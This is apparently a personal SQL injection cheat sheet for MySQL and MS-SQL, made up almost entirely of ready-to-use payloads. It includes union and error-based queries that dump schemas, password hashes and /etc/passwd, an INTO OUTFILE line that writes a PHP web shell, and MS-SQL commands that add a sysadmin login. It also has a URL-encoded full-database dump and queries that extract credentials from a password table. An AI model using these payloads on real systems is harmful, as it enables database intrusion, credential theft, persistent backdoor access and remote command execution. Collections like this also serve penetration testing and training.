## MySQL
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
### Union
```
1+1
hex(1)
-1 group by 12
-1 union select "1","2","3"
-1 union select "1",(select @@version),"3"
-1 union select "1",(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT 0,1),"3"
-1 union select "1",(select group_concat(SCHEMA_NAME,":") from Information_Schema.SCHEMATA), "3"
-1 union select "1",(select group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") from Information_Schema.COLUMNS where TABLE_SCHEMA='hotel'), "3"
-1 union select "1",(select group_concat(host,":",user,":",password,"\r\n") from mysql.user),"3"
-1 union select "1",(LOAD_FILE("/etc/passwd")),"3"
-1 union select "1",(TO_base64(LOAD_FILE("/etc/passwd"))),"3"
-1 union select "1",(select "<?php exec($_GET['cmd']); ?>"), "3" INTO OUTFILE '/var/www/html/cmd.php'
```
### Bypass space
```
/**/
```

### Error based
Find version, user, database
```
-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
```
Find schema, tables, columns, data
```

```

### Stack and time-based
```
asdf'; WAITFOR DELAY '0:0:10'--
```

## MS-SQL
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
### Adduser
```
EXEC sp_addlogin 'quang', 'pass'; 
exec sys.sp_addsrvrolemember @loginame=N'quang', @rolename = N'sysadmin' ;-- -
```

### Error-based
Find database, user, version
```
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,@@version);-- -
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,DB_NAME(1));-- -
```
Dump all into a table?
http://securityidiots.com/Web-Pentest/SQL-Injection/mssql/mssql-dios.html
```
as');BEGIN%20DECLARE%20@data%20VARCHAR%288000%29,%20@counter%20int,%20@tblName%20VARCHAR%2850%29,%20@colNames%20VARCHAR%28100%29%20DECLARE%20@tmpTbl%20TABLE%20%28name%20VARCHAR%288000%29%20NOT%20NULL%29%20SET%20@counter%20%3d%201%20SET%20@data%3d%27a%27%2bchar%2810%29%2b%27Injected%20by%20Zen%20::%20%27%2b%27char%2810%29%27%2b@@version%2b%27Database%20::%20%27%2bdb_name%28%29%2bchar%2810%29%2bchar%2810%29%20SET%20@tblName%20%3d%20%27%27%20SET%20@colNames%20%3d%20%27%27%20WHILE%20@counter%3C%3d%28SELECT%20COUNT%28table_name%29%20FROM%20INFORMATION_SCHEMA.TABLES%29%20BEGIN%20SET%20@colNames%20%3d%20%27%27%20SELECT%20@tblName%20%3d%20table_name%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_NAME%20NOT%20IN%20%28select%20name%20from%20@tmpTbl%29%20SELECT%20@colNames%20%3d%20@colNames%20%2b%27%20:%20%27%2bcolumn_name%20%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%20%3d%20@tblName%20INSERT%20@tmpTbl%20VALUES%28@tblName%29%20SET%20@data%3d@data%2b%27Table%20:%20%27%2b@tblName%2bchar%2810%29%2b%27Columns%20:%27%2b@colNames%2bchar%2810%29%20SET%20@counter%20%3d%20@counter%20%2b%201%20END%20SELECT%20@data%20AS%20output%20INTO%20err_dios%20END--
```
List tables
```
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 name FROM (SELECT DISTINCT top 1 name FROM archive..sysobjects where xtype='U' ORDER BY name ASC) sq ORDER BY name DESC)+CHAR(58)))--
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,(select string_agg(name,':') from archive..sysobjects where xtype='U'))--
```
List columns
```
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,(select string_agg(archive..syscolumns.name,':') from archive..syscolumns, archive..sysobjects where archive..syscolumns.id=archive..sysobjects.id and archive..sysobjects.name='pmanager'))--
```
Get data
```
asdf'); SELECT name FROM master..sysdatabases where 1=CONVERT(INT,(select string_agg(concat(psw,' ',id,' ',alogin),':') from archive.dbo.pmanager))--
```
